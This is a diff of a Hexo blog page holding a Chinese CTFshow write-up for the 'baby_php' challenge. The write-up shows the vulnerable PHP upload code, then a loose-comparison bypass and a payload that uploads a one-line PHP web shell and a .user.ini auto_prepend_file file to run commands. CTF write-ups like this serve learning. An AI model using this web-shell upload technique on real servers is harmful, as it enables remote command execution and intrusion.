@@ -4,9 +4,15 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CTFshow记录, Jlan&#39;s Little World">
+    <meta name="keywords" content="CTFshow记录, J1an&#39;s Little World">
     <meta name="description" content="baby杯——baby_php审计代码，明显是文件上传
-12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505">
+class fileUtil&amp;#123;
+
+    private $name;
+    private $content;
+
+
+    public function __const">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +24,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>CTFshow记录 | Jlan&#39;s Little World</title>
+    <title>CTFshow记录 | J1an&#39;s Little World</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -46,8 +52,6 @@
 
 
     
-        <link rel="stylesheet" type="text/css" href="/css/reward.css">
-    
 
 
 
@@ -65,7 +69,7 @@
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">Jlan&#39;s Little World</span>
+                    <span class="logo-span">J1an&#39;s Little World</span>
                 </a>
             </div>
             
@@ -86,55 +90,11 @@
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
     <a href="/archives" class="waves-effect waves-light">
       
       <i class="fas fa-archive" style="zoom: 0.6;"></i>
       
       <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
     </a>
     
   </li>
@@ -169,7 +129,7 @@
         
         <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
-        <div class="logo-name">Jlan&#39;s Little World</div>
+        <div class="logo-name">J1an&#39;s Little World</div>
         <div class="logo-desc">
             
             Never really desperate, only the lost of the soul.
@@ -192,55 +152,11 @@
         
         <li class="m-nav-item">
 	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
 		<a href="/archives" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-archive"></i>
 			
 			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
 		</a>
           
         </li>
@@ -400,20 +316,102 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
 
         
 
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h3 id="baby杯——baby-php"><a href="#baby杯——baby-php" class="headerlink" title="baby杯——baby_php"></a>baby杯——baby_php</h3><p>审计代码，明显是文件上传</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fileUtil</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$content</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">        ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_upload</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;waf(<span class="keyword">$this</span>-&gt;name) &amp;&amp; <span class="keyword">$this</span>-&gt;waf(<span class="keyword">$this</span>-&gt;content))&#123;</span><br><span class="line">            <span class="keyword">return</span> file_put_contents(<span class="keyword">$this</span>-&gt;name, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> !preg_match(<span class="string">&#x27;/php/i&#x27;</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_download</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;name))&#123;</span><br><span class="line">            header(<span class="string">&#x27;Content-Type: application/octet-stream&#x27;</span>);</span><br><span class="line">            header(<span class="string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">            header(<span class="string">&#x27;Content-Transfer-Encoding: binary&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]?<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]:highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>===<span class="string">&#x27;upload&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Permission denied&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">        <span class="variable">$ft</span> = <span class="keyword">new</span> fileUtil(<span class="variable">$name</span>,<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ft</span>-&gt;file_upload())&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&#x27; upload success!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;download&#x27;</span>:</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$ft</span> = <span class="keyword">new</span> fileUtil(<span class="variable">$name</span>,<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ft</span>-&gt;file_download()===<span class="literal">False</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&#x27; download failed&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;baby come on&#x27;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">class fileUtil&#123;
+
+    private $name;
+    private $content;
+
+
+    public function __construct($name,$content&#x3D;&#39;&#39;)&#123;
+        $this-&gt;name &#x3D; $name;
+        $this-&gt;content &#x3D; $content;
+        ini_set(&#39;open_basedir&#39;, &#39;&#x2F;var&#x2F;www&#x2F;html&#39;);
+    &#125;
+
+    public function file_upload()&#123;
+        if($this-&gt;waf($this-&gt;name) &amp;&amp; $this-&gt;waf($this-&gt;content))&#123;
+            return file_put_contents($this-&gt;name, $this-&gt;content);
+        &#125;else&#123;
+            return 0;
+        &#125;
+    &#125;
+
+    private function waf($input)&#123;
+        return !preg_match(&#39;&#x2F;php&#x2F;i&#39;, $input);
+    &#125;
+
+    public function file_download()&#123;
+        if(file_exists($this-&gt;name))&#123;
+            header(&#39;Content-Type: application&#x2F;octet-stream&#39;);
+            header(&#39;Content-Disposition: attachment; filename&#x3D;&quot;&#39;.$this-&gt;name.&#39;&quot;&#39;);
+            header(&#39;Content-Transfer-Encoding: binary&#39;);
+            echo file_get_contents($this-&gt;name);
+        &#125;else&#123;
+            return False;
+        &#125;
+    &#125;
+
+    public function __destruct()&#123;
+
+    &#125;
+
+&#125;
+
+$action &#x3D; $_GET[&#39;a&#39;]?$_GET[&#39;a&#39;]:highlight_file(__FILE__);
+
+if($action&#x3D;&#x3D;&#x3D;&#39;upload&#39;)&#123;
+    die(&#39;Permission denied&#39;);
+&#125;
+
+switch ($action) &#123;
+    case &#39;upload&#39;:
+        $name &#x3D; $_POST[&#39;name&#39;];
+        $content &#x3D; $_POST[&#39;content&#39;];
+        $ft &#x3D; new fileUtil($name,$content);
+        if($ft-&gt;file_upload())&#123;
+            echo $name.&#39; upload success!&#39;;
+        &#125;
+        break;
+    case &#39;download&#39;:
+        $name &#x3D; $_POST[&#39;name&#39;];
+        $ft &#x3D; new fileUtil($name,$content);
+        if($ft-&gt;file_download()&#x3D;&#x3D;&#x3D;False)&#123;
+            echo $name.&#39; download failed&#39;;
+        &#125;
+        break;
+    default:
+        echo &#39;baby come on&#39;;
+        break;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>小知识：$_GET[‘a’]在没有被赋值时默认值时true，case的判定是弱相等</p>
 <p>关键代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]?<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]:highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>===<span class="string">&#x27;upload&#x27;</span>)&#123;<span class="comment">//a只声明不赋值默认为true，强相等判定无法通过</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Permission denied&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:<span class="comment">//true==&quot;upload&quot;，判定结果为真，进入upload上传文件</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">$action &#x3D; $_GET[&#39;a&#39;]?$_GET[&#39;a&#39;]:highlight_file(__FILE__);
+
+if($action&#x3D;&#x3D;&#x3D;&#39;upload&#39;)&#123;&#x2F;&#x2F;a只声明不赋值默认为true，强相等判定无法通过
+    die(&#39;Permission denied&#39;);
+&#125;
+
+switch ($action) &#123;
+    case &#39;upload&#39;:&#x2F;&#x2F;true&#x3D;&#x3D;&quot;upload&quot;，判定结果为真，进入upload上传文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>查看响应头中间件为nginx，上传.user.ini文件来包含，一定要先上传1.txt文件，不然在auto_prepend_file参数生效并且找不到1.txt时整个环境就废了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload:?a=</span><br><span class="line">POST:</span><br><span class="line">content=&lt;?=`$_GET[&#x27;kkk&#x27;]`;?&gt;&amp;name=1.txt</span><br><span class="line">POST:</span><br><span class="line">content=auto_prepend_file=&quot;1.txt&quot;&amp;name=.user.ini</span><br><span class="line"></span><br><span class="line">payload:?kkk=tac /flag_baby_here_you_are</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">payload:?a&#x3D;
+POST:
+content&#x3D;&lt;?&#x3D;&#96;$_GET[&#39;kkk&#39;]&#96;;?&gt;&amp;name&#x3D;1.txt
+POST:
+content&#x3D;auto_prepend_file&#x3D;&quot;1.txt&quot;&amp;name&#x3D;.user.ini
+
+payload:?kkk&#x3D;tac &#x2F;flag_baby_here_you_are<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">
                 
@@ -431,7 +429,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">Jlan</a>
+                    <a href="/about" rel="external nofollow noreferrer">J1an</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -454,7 +452,7 @@
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">Jlan</a>
+                    <a href="/about" target="_blank">J1an</a>
                     !
                 </span>
             </div>
@@ -506,39 +504,6 @@
                 </div>
             </div>
             
-                <div id="reward">
-    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
-
-    <!-- Modal Structure -->
-    <div id="rewardModal" class="modal">
-        <div class="modal-content">
-            <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
-            <div class="reward-content">
-                <div class="reward-tabs">
-                    <ul class="tabs row">
-                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
-                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
-                    </ul>
-                    <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
-                    </div>
-                    <div id="wechat">
-                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<script>
-    $(function () {
-        $('.tabs').tabs();
-    });
-</script>
-
-            
         </div>
     </div>
 
@@ -589,7 +554,7 @@
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -638,7 +603,7 @@
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -673,6 +638,9 @@
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
 
 
 <!-- 代码语言 -->
@@ -781,69 +749,15 @@
 
     <footer class="page-footer bg-color">
     
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
-
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
-
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
-    }
-
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
-    }
-
-    
-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="503838841"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
-    </div>
-</div>
-
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="/libs/aplayer/Meting.min.js"></script>
-
-    
 
     <div class="container row center-align"
          style="margin-bottom: 0px !important;">
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2019-2022</span>
+                <span id="year">2022</span>
             
-            <a href="/about" target="_blank">Jlan</a>
+            <a href="/about" target="_blank">J1an</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
@@ -878,7 +792,7 @@
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:jlan@icloud.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
     </a>
 
@@ -886,10 +800,8 @@
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
+    <a href="https://twitter.com/J1an45" class="tooltipped" target="_blank" data-tooltip="关注我的Twitter: https://twitter.com/J1an45" data-position="top" data-delay="50">
+        <i class="fab fa-twitter"></i>
     </a>
 
 
@@ -898,9 +810,7 @@
 
 
 
-    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fas fa-rss"></i>
-    </a>
+
 
 </div>
     </div>
@@ -1060,6 +970,14 @@ $(function () {
     
 
     <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
     
 
      
@@ -1086,8 +1004,6 @@ $(function () {
     })();
 </script>
 
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
     
     
     <script async src="/libs/others/busuanzi.pure.mini.js"></script>
